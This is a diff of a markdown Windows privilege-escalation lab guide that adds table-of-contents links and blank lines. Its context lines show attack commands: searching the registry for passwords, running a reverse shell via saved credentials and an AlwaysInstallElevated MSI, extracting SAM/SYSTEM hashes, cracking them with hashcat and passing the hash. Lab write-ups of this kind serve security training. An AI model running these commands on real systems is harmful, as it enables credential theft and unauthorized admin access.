@@ -8,13 +8,13 @@
     * SE03 - [Weak Registry Permissions](#se03---weak-registry-permissions)
     * SE04 - [Insecure Service Executables](#se04---insecure-service-executables)
 * Registry Exploits
-    * RE01 - AutoRuns
-    * RE02 - AlwaysInstallElevated
+    * RE01 - [AutoRuns](#re01---AutoRuns)
+    * RE02 - [AlwaysInstallElevated](#re02---alwaysinstallelevated)
 * Password Exploits
-    * PE01 - Registry
-    * PE02 - Saved Credentials
-    * PE03 - Security Account Manager
-    * PE04 - Pass The Hash
+    * PE01 - [Registry](#pe01---registry)
+    * PE02 - [Saved Credentials](#pe02---saved-credentials)
+    * PE03 - [Security Account Manager](#pe03---security-account-manager)
+    * PE04 - [Pass The Hash](#pe04---pass-the-hash)
 * Scheduled Tasks
 
 
@@ -140,6 +140,7 @@ net start filepermsvc
 ## **Registry Exploits**
 
 ### **RE01 - AutoRuns**
+
 Query the registry for AutoRun executables:
 ```
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
@@ -179,6 +180,7 @@ msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 ## **Password Exploits**
 
 ### **PE01 - Registry**
+
 The registry can be searched for keys and values that contain the word "password":
 ```
 reg query HKLM /f password /t REG_SZ /s
@@ -193,6 +195,7 @@ winexe -U 'admin%password' //MACHINE_IP cmd.exe
 ```
 
 ### **PE02 - Saved Credentials**
+
 List any saved credentials:
 ```
 cmdkey /list
@@ -205,6 +208,7 @@ runas /savecred /user:admin C:\PrivEsc\reverse.exe
 ```
 
 ### **PE03 - Security Account Manager**
+
 The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.
 
 Transfer the SAM and SYSTEM files to your Kali VM:
@@ -223,6 +227,7 @@ Crack the admin NTLM hash using hashcat:
 hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
 ```
 ### **PE04 - Pass The Hash**
+
 Why crack a password hash when you can authenticate using the hash?
 
 Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:
